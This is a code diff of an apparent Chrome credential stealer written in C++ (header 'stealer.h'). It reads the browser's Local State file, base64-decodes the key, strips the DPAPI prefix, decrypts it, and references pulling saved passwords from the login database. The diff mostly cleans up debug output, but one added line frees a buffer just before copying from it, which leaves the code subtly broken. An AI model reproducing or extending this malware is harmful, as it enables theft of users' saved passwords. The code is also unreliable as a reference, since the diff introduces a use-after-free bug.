@@ -1,5 +1,6 @@
 #include "stealer.h"
 
+//do base 64 decoding!
 std::vector<BYTE> b64Decode(std::string strInput){
     // as before you should make two calls to ::CryptStringToBinaryA 
     char * toDecrypt = new char[strInput.length() + 1];
@@ -20,10 +21,12 @@ std::vector<BYTE> b64Decode(std::string strInput){
         printf("2nd call failed \n");
         printf("Last error: %d\n", GetLastError());
     }
+    free(retBuff);
     std::vector<BYTE> ByteVector(retBuff, retBuff + bytes );
     return ByteVector;
 }
 
+//read a file and use buffer
 char * readFile(char * fileName){
         DWORD fileSize;
         char* buffer;
@@ -76,21 +79,16 @@ char * readFile(char * fileName){
 
     std::vector<byte> Key = b64Decode(key);
     //std::cout << "KEY after Decoding: ";
-
+    free(lpProfileDir);
     return Key;
 
 }
 
+//get the encryption key and decrypt
 PDATA_BLOB GetEncryptionKey(){
-    //cant rlly test yet
-    //printf("IN get encrpyt key \n");
     std::vector<byte> temp_key = GetLocalState();
     BYTE * Key = temp_key.data() + 5;
-    //omit first 5 chars 
-    //printf("FIRST 5 chars: \n");
-    for (int i = 0; i < 5; i++){
-        putchar(temp_key[i]);
-    }
+    
     //printf("\nITS DPAPI\n");
     //omg it actually works:((( im going to cry
     PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
@@ -106,16 +104,6 @@ PDATA_BLOB GetEncryptionKey(){
     return Ret_Blob;
 }
 
-/* not used*/
-static int callback(void *data, int argc, char **argv, char **azColName){
-   int i;
-   for(i = 0; i<argc; i++){
-      printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
-   }
-
-   printf("\n");
-   return 0;
-}
 
 json driver(){
     HANDLE hToken =  GetCurrentProcessToken();
@@ -210,12 +198,6 @@ json driver(){
     }
 
     
-
-    /*
-    for (DWORD i = 0; i < key->cbData; i++){
-        printf("%x", key->pbData[i]);
-    }
-    */
     
    //std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
    json test;
